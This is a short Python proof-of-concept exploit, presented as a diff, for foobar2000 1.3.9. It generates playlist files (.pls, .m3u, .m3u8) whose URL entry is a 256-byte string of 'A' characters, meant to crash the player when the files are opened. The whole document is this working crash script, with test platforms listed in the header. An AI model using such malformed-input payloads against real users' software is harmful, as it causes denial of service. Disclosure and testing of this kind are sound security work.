@@ -1,0 +1,27 @@
+# Exploit Title: foobar2000 1.3.9 (.pls; .m3u; .m3u8) Local Crash PoC
+# Date: 11-15-2015
+# Exploit Author: Antonio Z.
+# Vendor Homepage: http://www.foobar2000.org/
+# Software Link: http://www.foobar2000.org/getfile/036be51abc909653ad44d664f0ce3668/foobar2000_v1.3.9.exe
+# Version: 1.3.9
+# Tested on: Windows XP SP3, Windows 7 SP1 x86, Windows 7 SP1 x64, Windows 8.1 x64, Windows 10 x64
+
+import os
+
+evil = '\x41' * 256
+
+pls = '[playlist]\n' + 'NumberOfEntries=1\n' +'File1=http://' + evil + '\n' + 'Title1=\n' + 'Length1=-1\n'
+m3u = 'http://' + evil
+m3u8 = 'http://' + evil
+
+file = open('Local_Crash_PoC.pls', 'wb')
+file.write(pls)
+file.close()
+
+file = open('Local_Crash_PoC.m3u', 'wb')
+file.write(m3u)
+file.close()
+
+file = open('Local_Crash_PoC.m3u8', 'wb')
+file.write(m3u8)
+file.close()
